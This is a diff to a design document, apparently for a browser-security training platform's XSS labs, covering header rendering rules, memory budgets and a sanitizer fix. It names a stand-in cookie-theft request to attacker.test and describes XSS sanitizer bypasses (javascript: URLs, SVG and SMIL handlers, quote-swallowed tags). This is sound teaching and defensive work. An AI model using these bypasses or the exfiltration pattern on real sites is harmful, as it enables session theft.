@@ -181,6 +181,7 @@ case (g)). Divine resists every exploit.
 | `newMarker()`, `xssBrowser(world, handler, { marker, canary, interact?, dom? })`, `XSS_STEAL_URL` | `core/xss` (`core/victim.ts`) | XSS labs: the player's marker call per player and level, and the admin's browser whose rendered pages run through the oracle; a payload that runs sends `GET http://attacker.test/steal?c=<canary>` to the attacker log (section 13) |
 | `previewFrame(fragment, { marker?, title?, hash? })` | `core/xss` | the vulnerable fragment, live for the player, inside `<iframe sandbox="allow-scripts" srcdoc>`; the only raw output of an XSS view (section 13) |
 | `xssOracle(html, marker, opts?)`, `linkSinks(html)`, `roundTrip(html)`, `XSS_LIMITS` | `core/xss` | the static oracle itself (sinks, marker, mXSS), the links and resources a mail would load, a sanitizer's fixed-point seam, the bounds (section 13) |
+| `rendersDocument(headers)`, `DOCUMENT_MIME_TYPES` | `core/xss` (`core/victim.ts`, `core/xss/rules.ts`) | whether a browser renders an answer with these headers as an HTML or XML document, or not at all (another type, an attachment): the rule `xssBrowser` judges by, for a lab page that tells the player how the victim reads an answer (SC-05) |
 | `setLabHeaders(res, { csp?, frameAncestors?, xfo?, cors? })`, `labHeaders(h)`, `LabHeaders` | `core/http` | a level's CSP / `X-Frame-Options` / `frame-ancestors` / CORS on its OWN route's response, from an allow-list; `labHeaders` is the same lines as a plain object, for a citadel twin's `SimResponse` (section 4, "Lab headers") |
 
 `req.level` on a challenge route is already clamped to the implemented levels;
@@ -1263,7 +1264,8 @@ const labs = perSession((): LabState => {
 - **Memory.** A full instance is about 315 KiB at worst (measured with a full GC; about 270 KiB with short ASCII names).
   `simFs` caps its holder like a victim world: at most `SIM_LIMITS.newWorldsPerMinute` (30) new instances a minute,
   and each instance weighs `SIMFS_LIMITS.weight` (352 KiB) in the 96 MiB byte budget shared with every victim world
-  (section 8). A lab state with both a world and a file system (SC-05, SC-09) weighs both, about 1.6 MiB. Eviction
+  (section 8). A lab state weighs every store it holds: SC-05's (a world, the moderator's XSS browser and a file
+  system) about 1.9 MiB, SC-09's (a scroll desk: a file system only) 352 KiB. Eviction
   from that budget is a reset, so keep no limiter in this state. Upload labs have no limiter, so they may offer
   Restart (`reset: (req) => labs.reset(req)`).
 
@@ -1755,9 +1757,21 @@ has no `<summary>`).
   the verdict's `wellFormed: false`, `limited`, or `reachedMarker` with nothing run. The preview frame shows the
   review's body whenever the moderator's browser renders it. **At Inquisitor that body is XML, but the preview draws it
   inside an HTML page**, which forgives what an XML reader refuses (a missing `xmlns`, an unclosed tag): the page says
-  so, and the note tells the player why the moderator's browser ran nothing. The real `GET /sigil` (and the citadel's)
-  is the inert download at every level. Inquisitor and Divine refuse any `<!DOCTYPE` (a superset of "an internal
-  subset": a quoted `>` in the external id cannot slip a subset past it).
+  so, and the note tells the player why the moderator's browser ran nothing; which reading applies comes from the
+  engine's own rule (`rendersDocument(review.headers)`), never a lab copy of it. The real `GET /sigil` (and the
+  citadel's) is the inert download at every level: its CSP `sandbox` through `setLabHeaders` (`labHeaders` in the twin),
+  its type, `nosniff` and `attachment` (outside that allow-list) through `res.set`. Inquisitor and Divine refuse any
+  `<!DOCTYPE` (a superset of "an internal subset": a quoted `>` in the external id cannot slip a subset past it).
+  **A sanitizer written as text rules must know where tags are** (review M1): Inquisitor's first stripper ran over the
+  whole text, so a quote opened in text, a comment or CDATA swallowed a later start tag as an attribute value and kept
+  its handler. It now reads comments, CDATA and processing instructions past whole, strips inside each start tag only
+  (any XML name starts one, not only ASCII letters), drops `srcdoc`, and drops a `javascript:` URL from `href`, `src`,
+  `action` and `formaction` under any prefix once character references are undone and tabs and newlines removed, so
+  only SVG's own gap is left: SMIL events and a SMIL `href` animation. **Preview fidelity** (Chrome 157, after the
+  `javascript:` shim): an SVG `<a href="javascript:...">` fires in the preview when clicked, but an SVG
+  `xlink:href="javascript:..."` link and a SMIL `href` animation do not (the shim matches `a[href]` and reads the
+  `href` attribute), although the oracle, and Chrome outside a sandbox, run both. Those solves earn the flag without
+  a banner.
 - **HTML mail (FP-12).** Mail clients run no script. `linkSinks(html)` lists every link and resource URL in document
   order (`a`, `area`, `form`, `img`/`srcset`, CSS `url()`/`@import` ...), parsed with scripting off as a mail client
   parses. Build the mail's `links` from it, and classify each URL with `classifySimUrl`. It reports `link` with
